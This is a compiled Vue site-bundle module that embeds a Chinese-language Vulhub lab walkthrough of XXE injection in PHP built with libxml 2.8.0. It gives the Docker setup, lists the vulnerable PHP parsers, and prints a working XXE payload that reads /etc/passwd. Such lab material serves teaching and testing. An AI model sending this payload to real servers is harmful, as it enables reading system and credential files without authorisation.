import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as a,e as i}from"./app-58e4a7d6.js";const s={},l=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>libxml 2.9.0 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡。为了演示 PHP 环境下的 XXE 漏洞，本例会将 libxml 2.8.0 版本编译进 PHP 中。PHP 版本并不影响 XXE 利用。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动环境（PHP 7.0.30，libxml 2.8.0）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080/index.php</code> 即可看到 phpinfo。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Web 目录为 <code>./www</code>，其中包含 4 个文件：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ tree <span class="token builtin class-name">.</span>
<span class="token builtin class-name">.</span>
├── dom.php <span class="token comment"># 示例：使用DOMDocument解析body</span>
├── index.php
├── SimpleXMLElement.php <span class="token comment"># 示例：使用SimpleXMLElement类解析body</span>
└── simplexml_load_string.php <span class="token comment"># 示例：使用simplexml_load_string函数解析body</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发 XXE 漏洞，具体输出点请阅读这三个文件的代码。</p><p>Simple XXE Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529111116223.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13),d=[l];function t(c,o){return n(),a("div",null,d)}const m=e(s,[["render",t],["__file","PHP 环境 XML外部实体注入漏洞（XXE）.html.vue"]]);export{m as default};
